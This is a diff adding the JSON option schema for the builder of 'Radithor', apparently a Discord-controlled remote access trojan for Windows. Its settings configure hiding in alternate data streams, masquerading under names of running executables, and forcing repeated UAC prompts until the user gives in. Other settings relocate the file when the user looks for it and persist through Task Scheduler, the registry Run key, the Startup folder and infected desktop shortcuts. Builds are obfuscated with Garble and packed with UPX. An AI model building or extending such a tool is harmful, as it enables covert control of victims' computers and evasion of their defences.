@@ -1,0 +1,225 @@
+{
+    "bot": [
+        {
+            "name": "Bot token",
+            "info": "The token of the bot.",
+            "type": "text"
+        },
+        {
+            "name": "Server ID",
+            "info": "The ID of the server that will control the bot.",
+            "type": "text",
+            "attributes": { "type": "number" }
+        },
+        {
+            "name": "Category ID",
+            "info": "The ID of the category each session will be controlled in, if one is not specified, a category will be auto-generated.",
+            "type": "text",
+            "attributes": { "type": "number" }
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Command prefix",
+            "info": "The prefix of commands.",
+            "type": "text",
+            "attributes": { "maxlength": 1 },
+            "value": "."
+        },
+        {
+            "name": "Tracking ID",
+            "info": "A custom ID/code to help you keep track of this build.",
+            "type": "text"
+        },
+        {
+            "type": "separator"
+        }
+    ],
+    "setup": [
+        {
+            "name": "Use custom directory",
+            "info": "Installs Radithor to a custom directory. If unchecked, Radithor will install to %USERPROFILE%\\Music or an ADS of %PROGRAMFILES%\\Windows Media Player if it is elevated.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Custom directory path",
+            "info": "The path of the directory.",
+            "type": "text"
+        },
+        {
+            "name": "Randomize directory",
+            "info": "Picks a random directory from %USERPROFILE% or %PROGRAMFILES% if it is elevated. This has priority over \"Use custom directory\".",
+            "type": "checkbox"
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Use custom name",
+            "info": "Renames Radithor's file to the value of \"Custom name\".",
+            "type": "checkbox"
+        },
+        {
+            "name": "Custom name",
+            "info": "The name Radithor will rename itself to.",
+            "type": "text"
+        },
+        {
+            "name": "Randomize name",
+            "info": "Picks a random name from any currently running executable file. This has priority over \"Use custom name\".",
+            "type": "checkbox"
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Use alternate data stream",
+            "info": "Installs Radithor to a ADS. This has priority over all the above options.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Custom alternate data stream",
+            "info": "The Path of the ADS Radithor will install itself to. If this is empty, It will install to %USERPROFILE%\\AppData or %SYSTEMROOT% if it is elevated.",
+            "type": "text"
+        }
+    ],
+    "options": [
+        {
+            "name": "Require admin",
+            "info": "Requires Radithor to have admin privileges to run.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Prompt admin",
+            "info": "Triggers the User Account Control prompt to run Radithor as admin. This requires \"Require admin\" to be enabled.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Force admin",
+            "info": "Continuously triggers the User Account Control prompt until the user accepts. This requires \"Require admin\" to be enabled.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Continue without admin",
+            "info": "If the user declines the Account Control prompt while \"Require admin\" is enabled, Radithor will still run. This requires \"Require admin\" to be enabled.",
+            "type": "checkbox"
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Periodic relocation",
+            "info": "Periodically moves Radithor's file to another random location every few minutes as defined in \"Relocation interval\".",
+            "type": "checkbox"
+        },
+        {
+            "name": "Relocation interval",
+            "info": "How long in minutes to wait before changing Radithor's file path.",
+            "type": "slider",
+            "min": 1,
+            "max": 25
+        },
+        {
+            "name": "Relocate on discovery",
+            "info": "Monitors explorer's name and relocates Radithor whenever the name of the directory it is in appears in explorer's name. This will do anything if the settings for viewing hidden files is turned off and Radithor is hidden.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Instant panic mode",
+            "info": "Turns on Radithor's panic mode after it has initialized. See \"panic mode.md\" in the wiki for more info. This requires admin privileges to work.",
+            "type": "checkbox"
+        }
+    ],
+    "persistence": [
+        {
+            "name": "Persistence name",
+            "info": "The name of all persistence values or items.",
+            "type": "text"
+        },
+        {
+            "name": "Clone persistence file location",
+            "info": "Clones Radithor's file for ever persistence method instead of pointing back to a single file.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Ensure different persistence location",
+            "info": "Ensures the file path in the persistence locations never match the currently running file.",
+            "type": "checkbox"
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Task scheduler",
+            "info": "Uses the Task Scheduler, It will start Radithor continuously after that every 8 minutes.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Registry",
+            "info": "Uses the Run key in the Registry, It will also enable itself if it was disabled from task manager.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Startup folder",
+            "info": "Uses the Startup folder/shell:startup.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Desktop shortcut infection",
+            "info": "Modifies shortcut/.lnk files on the desktop to make Radithor startup when the shortcut is clicked.",
+            "type": "checkbox"
+        }
+    ],
+    "advanced": [
+        {
+            "name": "Whitelisted operator IDs",
+            "info": "User IDs of users that are allowed to run commands and interact with the bot. Whitelisted users can whitelist other users. If the value of this is empty, everyone in the server will be able to interact with the bot. Separate with \";\".",
+            "type": "text"
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Aggressive launch checks",
+            "info": "Saves the first device fingerprint gotten and checks it every time Radithor starts, this will make Radithor unable to start if used on another machine. This option is not recommended.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Involve fingerprint in encryption",
+            "info": "Encrypts the config a second time with the first device fingerprint gotten, this will make Radithor unable to start if used on another machine. This option is not recommended.",
+            "type": "checkbox"
+        }
+    ],
+    "site": [
+        {
+            "name": "End to end encryption",
+            "info": "Encrypts all saved data. Sends only encrypted data to the server.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Save config",
+            "info": "Saved the data set in the site.",
+            "type": "checkbox",
+            "value": true
+        },
+        {
+            "name": "Obfuscate site title",
+            "info": "Renames the site title to \"localhost\" and does not show the build status.",
+            "type": "checkbox",
+            "value": true
+        }
+    ],
+    "build": [
+        {
+            "name": "Obfuscate build",
+            "info": "Obfuscates the build with Garble.",
+            "type": "checkbox"
+        },
+        {
+            "name": "Pack build",
+            "info": "Packs the build with UPX.",
+            "type": "checkbox"
+        }
+    ]
+}
